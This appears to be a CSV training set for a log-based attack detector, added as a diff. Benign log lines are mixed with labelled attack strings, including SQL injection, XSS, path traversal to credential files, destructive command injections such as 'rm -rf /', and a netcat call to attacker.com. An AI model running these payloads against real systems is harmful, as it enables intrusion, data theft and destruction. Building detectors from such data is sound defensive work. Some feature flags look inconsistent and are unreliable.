@@ -1,0 +1,101 @@
+payload,payload_length,special_char_count,sql_flag,failed_login_flag,label
+GET /home,9,1,0,0,0
+User login successful,21,0,0,0,0
+Response code 200,17,0,0,0,0
+Fetching user profile,21,0,0,0,0
+Session created for user,24,0,1,0,0
+POST /api/update-profile,24,3,1,0,0
+File uploaded successfully,26,0,0,0,0
+User logout successful,22,0,0,0,0
+Password changed successfully,29,0,1,0,0
+GET /dashboard,14,1,0,0,0
+"{""timestamp"": ""2024-11-19T08:15:12Z"", ""level"": ""error"", ""message"": ""Database connection failed"", ""context"": {""db_host"": ""db.internal"", ""error_code"": ""ETIMEDOUT""}}",162,43,1,1,0
+ERROR: Exception in user registration: UserAlreadyExistsException,65,2,1,0,0
+CRITICAL: 2024-11-19 10:07:00 - Out of Memory: Application terminating,70,7,1,0,0
+"127.0.0.1 - - [12/Oct/2021:13:55:36] ""GET /api/v1/users HTTP/1.1"" 200 1543",74,19,0,0,0
+2024-11-19 08:10:30 - Admin [ID: 1] deleted document [ID: 99],61,11,1,0,0
+INFO: 2024-11-19 10:00:01 - User [ID: 550] logged in from IP 192.168.1.1,72,12,0,0,0
+INFO: 2024-11-19 10:00:05 - Payment processed successfully for Order #12345,75,7,1,0,0
+INFO: Application started on port 8080,38,1,1,0,0
+DEBUG: [UserSession] Validating token for user 550,50,3,1,0,0
+DEBUG: [Database] Executing query: SELECT * FROM users WHERE id = 550,69,6,1,0,0
+WARN: 2024-11-19 10:05:00 - Slow response from external API: /payments (took 1500ms),84,10,0,0,0
+WARN: Disk usage on /var/log is at 85%,38,4,0,0,0
+Login attempt successful from IP 192.168.1.5,44,3,0,0,0
+Token generated successfully,28,0,0,0,0
+Password reset link sent,24,0,1,0,0
+Session expired for user,24,0,1,0,0
+CPU usage normal,16,0,1,0,0
+Memory usage stable,19,0,1,0,0
+Server uptime 72 hours,22,0,0,0,0
+Backup completed successfully,29,0,0,0,0
+User updated email address,26,0,1,0,0
+User enabled two-factor authentication,38,1,1,0,0
+User downloaded invoice,23,0,0,0,0
+Profile picture updated,23,0,1,0,0
+Notification settings changed,29,0,0,0,0
+PUT /api/update-password,24,3,1,0,0
+DELETE /api/temp-file,21,3,1,0,0
+PATCH /api/settings,19,2,0,0,0
+OPTIONS /api/status,19,2,0,0,0
+INFO: Cache cleared successfully,32,1,0,0,0
+WARNING: Disk usage at 80%,26,2,0,0,0
+INFO: Background job completed,30,1,0,0,0
+Service restarted successfully,30,0,0,0,0
+INFO: Scheduled backup completed at 02:00 AM,44,2,0,0,0
+User changed notification preferences,37,0,0,0,0
+GET /api/products,17,2,0,0,0
+Session token validated successfully,36,0,0,0,0
+INFO: Email verification link sent to user,42,1,0,0,0
+Health check passed for service auth-service,44,1,1,0,0
+User viewed order history,25,0,1,0,0
+GET /products?id=101' OR '1'='1' -- 200,39,11,1,0,1
+2024-11-19 09:01:05 WARN Failed login attempt for user 'admin' from IP 192.168.1.50 (repeated 100 times in 10 seconds),118,11,1,1,1
+GET /search?q=<script>alert('XSS')</script> 200,47,12,0,0,1
+GET /view_file?name=../../../../etc/passwd 403,46,17,0,0,1
+"INFO Database Query: SELECT * FROM credit_cards (Rows returned: 1,000,000)",74,8,1,0,1
+' OR 1=1 --,11,4,1,0,1
+admin' --,9,3,0,0,1
+SELECT * FROM users WHERE id='1' OR '1'='1',43,9,1,0,1
+Failed login attempt,20,0,0,1,1
+Invalid password,16,0,1,1,1
+Failed login attempt from IP 192.168.1.10,41,3,0,1,1
+Multiple login failures detected,32,0,0,0,1
+<script>alert('XSS')</script>,29,9,0,0,1
+../../etc/passwd,16,7,0,0,1
+%00%00%00,9,3,0,0,1
+DROP TABLE users;,17,1,1,0,1
+; rm -rf /,10,3,0,0,1
+&& shutdown -h now,18,3,0,0,1
+| cat /etc/passwd,17,3,0,0,1
+Failed login attempt from IP 192.168.1.16,41,3,0,1,1
+SELECT * FROM users WHERE id='0' OR '0'='0',43,9,1,0,1
+../../../windows/system32,25,10,0,0,1
+<iframe src='evil.com'></iframe>,32,9,0,0,1
+"INFO Database Query: SELECT * FROM debit_cards (Rows returned: 500,000)",71,7,1,0,1
+' OR 'a'='a,11,5,1,0,1
+""" OR """"=""",9,5,1,0,1
+1' OR '1'='1' --,16,8,1,0,1
+SELECT password FROM admin WHERE username='admin',49,3,1,0,1
+"INSERT INTO users VALUES('hack','hack')",39,7,1,0,1
+Failed login attempt for admin,30,0,1,1,1
+Invalid credentials from IP 10.0.0.5,36,3,0,1,1
+Too many login attempts detected,32,0,0,0,1
+User authentication failed repeatedly,37,0,0,1,1
+Password mismatch error,23,0,1,0,1
+<script>document.cookie</script>,32,6,0,0,1
+<img src=x onerror=alert(1)>,28,6,1,0,1
+javascript:alert('Hacked'),26,5,0,0,1
+<svg onload=alert('XSS')>,25,7,0,0,1
+../../../../etc/shadow,22,13,0,0,1
+..\..\windows\system32\cmd.exe,30,9,0,0,1
+/etc/passwd,11,2,0,0,1
+C:\Windows\System32\drivers\etc\hosts,37,6,0,0,1
+Port scan detected from IP 203.0.113.5,38,3,1,0,1
+Multiple requests to /admin panel,33,1,0,0,1
+Access denied to restricted endpoint /root,42,1,0,0,1
+Unusual traffic spike detected,30,0,0,0,1
+&& whoami,9,2,0,0,1
+| nc attacker.com 4444,22,2,0,0,1
+`cat /etc/passwd`,17,4,0,0,1
+; ls -la,8,2,0,0,1
